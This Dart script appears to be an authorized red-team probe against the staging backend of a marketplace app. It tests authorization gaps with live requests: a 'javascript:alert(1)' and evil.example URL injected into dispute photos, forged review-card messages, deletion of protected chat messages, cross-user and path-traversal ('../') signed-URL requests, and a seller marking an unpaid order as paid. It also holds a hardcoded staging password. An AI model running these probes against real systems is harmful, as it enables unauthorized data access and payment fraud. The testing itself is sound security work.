// ignore_for_file: avoid_print
/// Pass 2 — disputa replies UPDATE, storage sign B2, Z8 PATCH pago, review copy
import 'dart:convert';
import 'dart:io';

import 'package:http/http.dart' as http;

import '../live_ops_staging_client.dart';

const prefix = 'RTZ-20260901T1715-';
const probeFile = 'tool/redteam_blind_z_20260901T1715/probe_result.json';

Future<Map<String, dynamic>> req(
  String method,
  String u,
  Map<String, String> h, [
  Object? body,
]) async {
  final r = method == 'POST'
      ? await http.post(Uri.parse(u), headers: h, body: body == null ? null : jsonEncode(body))
      : method == 'PATCH'
          ? await http.patch(Uri.parse(u), headers: h, body: body == null ? null : jsonEncode(body))
          : method == 'DELETE'
              ? await http.delete(Uri.parse(u), headers: h)
              : await http.get(Uri.parse(u), headers: h);
  dynamic p;
  try {
    p = r.body.isEmpty ? null : jsonDecode(r.body);
  } catch (_) {
    p = r.body;
  }
  return {'http': r.statusCode, 'body': p, 'raw': r.body};
}

String? idOf(dynamic body) {
  if (body is List && body.isNotEmpty && body.first is Map) {
    final s = '${(body.first as Map)['id'] ?? ''}'.trim();
    return (s.isEmpty || s == 'null') ? null : s;
  }
  if (body is Map && body['id'] != null) {
    final s = '${body['id']}'.trim();
    return (s.isEmpty || s == 'null') ? null : s;
  }
  return null;
}

Map<String, dynamic>? firstMap(dynamic body) {
  if (body is List && body.isNotEmpty && body.first is Map) {
    return Map<String, dynamic>.from(body.first as Map);
  }
  if (body is Map) return Map<String, dynamic>.from(body);
  return null;
}

Future<void> main() async {
  final prior = jsonDecode(File(probeFile).readAsStringSync()) as Map;
  final e = loadLiveOpsStagingEnv();
  final url = normalizeSupabaseProjectUrl(envRequire(e, 'SUPABASE_URL'));
  final anon = envRequire(e, 'SUPABASE_ANON_KEY');
  final svc = envRequire(e, 'SUPABASE_SERVICE_ROLE_KEY');
  final sb = LiveOpsStagingClient(url: url, anonKey: anon, serviceRoleKey: svc);
  final buyerTok = await sb.signIn(
    email: envRequire(e, 'LIVE_OPS_TEST_BUYER_EMAIL'),
    password: envRequire(e, 'LIVE_OPS_TEST_BUYER_PASSWORD'),
  );
  final sellerTok = await sb.signIn(
    email: envRequire(e, 'LIVE_OPS_TEST_SELLER_EMAIL'),
    password: envRequire(e, 'LIVE_OPS_TEST_SELLER_PASSWORD'),
  );
  final b2Tok = await sb.signIn(
    email: 'demo_bot_01@staging.fleaber.bot',
    password: 'FleaberBotSim_Staging_2026!',
  );
  Map<String, String> h(String tok) => {
        'apikey': anon,
        'Authorization': 'Bearer $tok',
        'Content-Type': 'application/json',
        'Prefer': 'return=representation',
      };
  final BH = h(buyerTok);
  final SH = h(sellerTok);
  final B2H = h(b2Tok);
  final SVC = {
    'apikey': svc,
    'Authorization': 'Bearer $svc',
    'Content-Type': 'application/json',
    'Prefer': 'return=representation',
  };

  final oid = prior['order_id'] as String;
  final chatId = prior['chat_id'] as String;
  final unpaidId = prior['unpaid_id'] as String;
  final buyerId = prior['buyer'] as String;
  final extra = <Map<String, dynamic>>[];
  final closed = <Map<String, dynamic>>[];
  void f(String id, String sev, String title, Object obtained) {
    extra.add({'id': id, 'sev': sev, 'title': title, 'obtained': obtained});
    print('FINDING $sev $id · $title');
  }

  void c(String id, String msg) {
    closed.add({'id': id, 'msg': msg});
    print('CLOSED $id · $msg');
  }

  // schema sniff
  final oneDisp = await req('GET', '$url/rest/v1/order_disputes?select=*&limit=1', SVC);
  print('SNIFF disputes ${oneDisp['http']} ${oneDisp['raw'].toString().substring(0, (oneDisp['raw'] as String).length.clamp(0, 500))}');

  final oneReply = await req('GET', '$url/rest/v1/order_dispute_replies?select=*&limit=1', SVC);
  print('SNIFF replies ${oneReply['http']} ${oneReply['raw'].toString().substring(0, (oneReply['raw'] as String).length.clamp(0, 400))}');

  // create dispute with columns from sniff / dart
  for (final body in [
    {
      'order_id': oid,
      'buyer_id': buyerId,
      'reason': '${prefix}p2',
      'status': 'aberta',
      'current_turn': 'vendedor',
    },
    {
      'order_id': oid,
      'opened_by': buyerId,
      'reason': '${prefix}p2b',
      'status': 'aberta',
    },
  ]) {
    final r = await req('POST', '$url/rest/v1/order_disputes', SVC, body);
    print('DISP INS ${r['http']} ${r['raw']}');
    final did = idOf(r['body']);
    if (did != null) {
      final reply = await req('POST', '$url/rest/v1/order_dispute_replies', BH, {
        'dispute_id': did,
        'sender_id': buyerId,
        'message': '${prefix}ok',
        'proof_photos': [
          'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/x'
        ],
      });
      print('REPLY INS ${reply['http']} ${reply['raw']}');
      final rid = idOf(reply['body']);
      if (rid != null) {
        final patch = await req(
          'PATCH',
          '$url/rest/v1/order_dispute_replies?id=eq.$rid',
          BH,
          {
            'proof_photos': [
              'javascript:alert(1)',
              'https://evil.example/x.png',
            ],
          },
        );
        final row = firstMap((await req(
          'GET',
          '$url/rest/v1/order_dispute_replies?id=eq.$rid&select=id,proof_photos',
          SVC,
        ))['body']);
        print('REPLY PATCH ${patch['http']} ${row}');
        final photos = '${row?['proof_photos']}';
        if ((patch['http'] as int) < 300 &&
            (photos.contains('javascript') || photos.contains('evil'))) {
          f(
            'Z4-DISPUTE-REPLY-UPDATE-PHOTOS',
            'P1',
            'PATCH proof_photos javascript/externo — trigger só INSERT',
            {'http': patch['http'], 'photos': row?['proof_photos']},
          );
        } else {
          c('Z4.reply_update', '${patch['http']} $photos ${patch['raw']}');
        }
      } else {
        c('Z4.reply_ins', '${reply['http']} ${reply['raw']}');
      }
      break;
    }
  }

  // review card stronger copy
  final rev = await req('POST', '$url/rest/v1/chat_messages', BH, {
    'chat_id': chatId,
    'text':
        'FLEABER_JSON_V1:${jsonEncode({
          'kind': 'order_review_submitted',
          'order_id': oid,
          'author_role': 'comprador',
          'stars': 1,
        })}',
  });
  print('REV CARD ${rev['http']} ${rev['raw']}');
  if ((rev['http'] as int) < 300) {
    f(
      'Z5-REVIEW-CARD-WALLET-COPY',
      'P1',
      'author_role=comprador stars=1 — UI vendedor: «Avaliação recebida. O valor ficará disponível na tua carteira» sem review/release na BD',
      {'id': idOf(rev['body'])},
    );
  } else {
    c('Z5.review_wallet_copy', '${rev['http']} ${rev['raw']}');
  }

  // DELETE raw bundle (no prefix) — immutability gap
  final rawMsgs = await req(
    'GET',
    '$url/rest/v1/chat_messages?chat_id=eq.$chatId&text=like.*6543.21*&select=id,text',
    SVC,
  );
  print('RAW LOOKUP ${rawMsgs['raw']}');
  final rawGhost = await req(
    'GET',
    '$url/rest/v1/chat_messages?chat_id=eq.$chatId&text=like.*8888*&select=id,text,sender_id',
    SVC,
  );
  print('RAW 8888 ${rawGhost['raw']}');
  if (rawGhost['body'] is List) {
    for (final row in rawGhost['body'] as List) {
      if (row is! Map) continue;
      final text = '${row['text']}';
      if (text.startsWith('FLEABER_JSON_V1:')) continue;
      final mid = row['id'];
      final del = await req(
        'DELETE',
        '$url/rest/v1/chat_messages?id=eq.$mid',
        BH,
      );
      final still = await req(
        'GET',
        '$url/rest/v1/chat_messages?id=eq.$mid',
        SVC,
      );
      final gone = still['body'] is List && (still['body'] as List).isEmpty;
      print('DEL RAW $mid http=${del['http']} gone=$gone');
      if (gone) {
        f(
          'Z2-DELETE-RAW-BUNDLE-CARD',
          'P2',
          'Card bundle_proposal em JSON cru (sem prefixo) é apagável — o trigger só protege FLEABER_JSON_V1',
          {'id': mid, 'del': del['http']},
        );
      }
    }
  }

  // B2 sign EXISTING object
  final stPath =
      'order_proofs/$buyerId/$oid/${prefix}overwrite.png';
  final signB2 = await req(
    'POST',
    '$url/storage/v1/object/sign/fleaber_private/$stPath',
    B2H,
    {'expiresIn': 120},
  );
  print('B2 SIGN EXISTING ${signB2['http']} ${signB2['raw']}');
  if ((signB2['http'] as int) < 300) {
    f(
      'Z4-B2-SIGN-VICTIM-PROOF',
      'P1',
      'B2 signed URL de order_proofs do buyer1',
      signB2['body'],
    );
  } else {
    c('Z4.b2_sign_existing', '${signB2['http']} ${signB2['raw']}');
  }

  final signB1 = await req(
    'POST',
    '$url/storage/v1/object/sign/fleaber_private/$stPath',
    BH,
    {'expiresIn': 120},
  );
  print('B1 SIGN ${signB1['http']} ${signB1['raw']}');

  // path traversal sign as buyer
  final trav = 'chat_uploads/../order_proofs/$buyerId/$oid/${prefix}overwrite.png';
  final signTrav = await req(
    'POST',
    '$url/storage/v1/object/sign/fleaber_private/$trav',
    BH,
    {'expiresIn': 120},
  );
  print('TRAV SIGN ${signTrav['http']} ${signTrav['raw']}');
  if ((signTrav['http'] as int) < 300) {
    f(
      'Z4-SIGNED-URL-PATH-TRAVERSAL',
      'P1',
      'createSignedUrl aceita chat_uploads/../order_proofs/…',
      signTrav['body'],
    );
  } else {
    c('Z4.trav_sign', '${signTrav['http']} ${signTrav['raw']}');
  }

  // Z8: seller PATCH unpaid → pago (honor system vs chat)
  final before = firstMap((await req(
    'GET',
    '$url/rest/v1/orders?id=eq.$unpaidId&select=id,status,amount_paid_cents,stripe_payment_intent_id',
    SVC,
  ))['body']);
  final patchPago = await req(
    'PATCH',
    '$url/rest/v1/orders?id=eq.$unpaidId',
    SH,
    {'status': 'pago'},
  );
  final after = firstMap((await req(
    'GET',
    '$url/rest/v1/orders?id=eq.$unpaidId&select=id,status,amount_paid_cents,stripe_payment_intent_id',
    SVC,
  ))['body']);
  print('Z8 PATCH PAGO ${patchPago['http']} before=$before after=$after ${patchPago['raw']}');
  if ('${after?['status']}' == 'pago' &&
      ((after?['amount_paid_cents'] as num?) ?? 0) == 0 &&
      (after?['stripe_payment_intent_id'] == null ||
          '${after?['stripe_payment_intent_id']}'.isEmpty)) {
    f(
      'Z8-SELLER-PATCH-PAGO-DIRECT',
      'P1',
      'Seller JWT PATCH status=pago em reserva directa sem Stripe — fluxo de produto (honor), não Edge a ler o chat. Cards forjados podem induzir o clique.',
      {'before': before, 'after': after, 'http': patchPago['http']},
    );
  } else {
    c('Z8.seller_pago', '${patchPago['http']} after=$after ${patchPago['raw']}');
  }

  // OpenAPI rpc names with chat
  final spec = await req('GET', '$url/rest/v1/', SVC);
  print('OPENAPI http=${spec['http']} keys=${spec['body'] is Map ? (spec['body'] as Map).keys.take(8).toList() : 'n/a'}');

  File('tool/redteam_blind_z_20260901T1715/pass2_result.json').writeAsStringSync(
    const JsonEncoder.withIndent('  ').convert({
      'extra': extra,
      'closed': closed,
    }),
  );
  print('--- pass2 extra=${extra.length} closed=${closed.length} ---');
}
